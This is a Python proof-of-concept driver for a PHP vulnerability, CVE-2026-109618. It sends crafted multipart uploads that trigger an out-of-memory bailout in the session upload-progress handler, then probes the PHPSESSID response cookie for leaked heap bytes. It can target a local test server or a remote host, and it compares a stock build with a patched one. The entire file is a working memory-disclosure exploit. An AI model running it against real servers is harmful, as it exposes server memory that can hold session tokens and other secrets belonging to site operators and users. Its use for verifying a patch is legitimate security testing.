#!/usr/bin/env python3
"""CVE-2026-109618 leak leg (618-b): dangling PS(id) -> URL-encoded heap
disclosure in the PHPSESSID response cookie. Stdlib only.

Vendor-native arm shape (from the shipped regression
tests/basic/oom_rfc1867_upload_progress.phpt):
  - PHPSESSID and PHP_SESSION_UPLOAD_PROGRESS ride as the FIRST TWO multipart
    body parts (the progress handler only engages once it has seen both).
  - OOM is reached inside the progress handler, not the parser: many small
    file parts grow $_SESSION's progress 'files' array, and with
    upload_progress.freq=1 every FILE_DATA re-encodes the whole session ->
    the soft memory limit dies inside the handler on a ~400KB body.
  - Input limits raised (max_file_uploads et al) so only memory_limit bites.

Arm on a venue:
  R1 = preamble + N tiny file parts -> parse-window OOM bailout frees the
       request heap with PS(id)/session state published.
  R2 = preamble + 2 small parts, repeated N_REP times -> if the upload-progress
       path consumes the stale PS(id), the Set-Cookie PHPSESSID carries
       URL-encoded reclaimed bytes. Discriminator: a leaked stale value is
       the SAME string every R2 (same source allocation); a fresh SID is
       random per request.

Venues: VENUE=bench (php -S, 4M — vendor matrix never tested this) or
        VENUE=remote (mod_php prefork = the vendor-demonstrated window;
        body parse happens before php_request_startup).
Env: VENUE RHOST RPORT N_PARTS N_REP PHP_BIN PORT ARM_MB
"""
import os, re, socket, subprocess, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
VENUE = os.environ.get('VENUE', 'bench')
PORT = int(os.environ.get('PORT', '18913'))
RHOST = os.environ.get('RHOST', '192.168.51.170')
RPORT = int(os.environ.get('RPORT', '18990'))
PHP_BIN = os.environ.get('PHP_BIN', 'php')
N_PARTS = int(os.environ.get('N_PARTS', '4000'))
N_REP = int(os.environ.get('N_REP', '3'))
ARM_MB = int(os.environ.get('ARM_MB', '4'))
BOUND = '-------------------cve2leak'
SID1 = 'abcdef0123456789abcdef0123456789'   # vendor's shape
SID2 = 'feedfacecafebeef001122334455667788'

INI = ['-d', 'memory_limit=%dM' % ARM_MB, '-d', 'post_max_size=64M',
       '-d', 'upload_max_filesize=32M',
       '-d', 'max_input_vars=10000000', '-d', 'max_file_uploads=1000000',
       '-d', 'max_multipart_body_parts=10000000',
       '-d', 'session.save_path=/tmp/cve2-sess',
       '-d', 'session.upload_progress.enabled=1',
       '-d', 'session.upload_progress.cleanup=1',
       '-d', 'session.upload_progress.min_freq=0',
       '-d', 'session.upload_progress.freq=1',
       '-d', 'session.use_only_cookies=0',
       '-d', 'session.use_strict_mode=0']

def preamble(sid, prog='k'):
    def fld(n, v):
        return ('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n' % (BOUND, n, v)).encode()
    return fld('PHPSESSID', sid) + fld('PHP_SESSION_UPLOAD_PROGRESS', prog)

def filepart(name, fname, body='xxxxxxxx'):
    return ('--%s\r\nContent-Disposition: form-data; name="%s"; filename="%s"\r\n'
            'Content-Type: text/plain\r\n\r\n%s\r\n' % (BOUND, name, fname, body)).encode()

def r1_body():
    fillen = int(os.environ.get('FILLEN', '0'))
    parts = [preamble(SID1)]
    for i in range(N_PARTS):
        nm = ('u%d' % i).ljust(fillen, 'A') if fillen else 'u%d' % i
        fn = ('f%d.txt' % i).ljust(fillen, 'A') if fillen else 'f%d.txt' % i
        parts.append(filepart(nm, fn))
    return b''.join(parts) + b'--' + BOUND.encode() + b'--\r\n'

def r2_body(sid=SID2):
    """R2 shape per R2_SID knob: where the session id rides (body part vs
    Cookie header vs both vs absent). PROGRESS field always present."""
    mode = os.environ.get('R2_SID', 'body')
    body = b''
    if mode in ('body', 'both'):
        body += preamble(sid)
    else:
        def fld(n, v):
            return ('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n'
                    % (BOUND, n, v)).encode()
        body += fld('PHP_SESSION_UPLOAD_PROGRESS', 'k')   # sid arrives via header/nowhere
    return body + filepart('u0', 'f0.txt') + b'--' + BOUND.encode() + b'--\r\n'

def r2_cookie_header():
    mode = os.environ.get('R2_SID', 'body')
    if mode in ('cookie', 'both'):
        return 'Cookie: PHPSESSID=%s\r\n' % os.environ.get('R2_COOKIE', SID2)
    return ''

def http_req(host, port, path, body, ctype='multipart/form-data; boundary=' + BOUND, cookie=''):
    try:
        s = socket.create_connection((host, port), timeout=180)
    except OSError as e:
        return 'CONNECT-FAIL(%s)' % e, [], True
    hdr = ("POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: %s\r\nContent-Length: %d\r\n"
           "%s"
           "Connection: close\r\n\r\n") % (path, ctype, len(body), cookie)
    try:
        s.sendall(hdr.encode() + body)
    except BrokenPipeError:
        pass
    data = b''
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    s.close()
    txt = data.decode('utf-8', 'replace')
    head = txt.split('\r\n\r\n', 1)[0]
    stat = head.split('\r\n', 1)[0] if head else 'NO-REPLY'
    cookies = re.findall(r'(?i)^set-cookie:\s*(.*?)\r?$', head, re.M)
    return stat, cookies, not txt

def run_arm(spawn=True, php_bin=None, label=''):
    php_bin = php_bin or PHP_BIN
    host, port = (RHOST, RPORT) if VENUE == 'remote' else ('127.0.0.1', PORT)
    app = 'leak_app.php' if VENUE == 'remote' else ''
    path = ('/' + app) if VENUE == 'remote' else '/'
    srv = None
    if spawn and VENUE != 'remote':
        os.makedirs('/tmp/cve2-sess', exist_ok=True)
        srv = subprocess.Popen(['setarch', '-R', php_bin, '-S', '127.0.0.1:%d' % PORT] + INI +
                               [os.path.join(HERE, 'leak_app.php')],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1.0)
    try:
        print('--- %s [%s:%d]' % (label, host, port))
        stat, cookies, aborted = http_req(host, port, path, r1_body())
        print('R1 (OOM arm, %d parts): %s%s | R1 set-cookie: %s' % (
            N_PARTS, stat, ' (closed mid-upload)' if aborted else '', cookies or 'none'))
        vals = []
        for i in range(N_REP):
            time.sleep(0.3)
            st2, ck2, ab2 = http_req(host, port, path, r2_body(),
                                     cookie=r2_cookie_header())
            got = None
            for c in ck2:
                m = re.search(r'PHPSESSID=([^;]*)', c)
                if m:
                    got = m.group(1)
                    break
            vals.append(got)
            print('  R2#%d %s%s cookie=%r' % (i + 1, st2, ' (aborted)' if ab2 else '', got))
        if all(v is None for v in vals):
            verdict = 'NO-COOKIE (disclosure leg not armed in this venue/shape)'
        elif len(set(vals)) == 1 and all(vals):
            stale = vals[0]
            extra = ' ==R1-SID(unreclaimed)' if stale == SID1 else ''
            extra += ' ==R2-SID(own)' if stale == SID2 else ''
            verdict = 'LEAK-STABLE (same value every R2, len=%d)%s' % (len(stale), extra)
        else:
            verdict = 'VARYING (differ per R2 -> fresh SID per request, not stale)'
        print('VERDICT: %s' % verdict)
        return verdict
    finally:
        if srv:
            srv.terminate(); srv.wait()

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'stock'
    if mode == 'stock':
        run_arm(label='stock 8.3.6 vendor-native arm')
    elif mode == 'patched':
        run_arm(php_bin=os.path.join(ROOT, 'php-8.3.36', 'sapi', 'cli', 'php'),
                label='patched 8.3.36 (fix must kill the leg)')
    else:
        print('usage: leak_driver.py [stock|patched]')

if __name__ == '__main__':
    main()
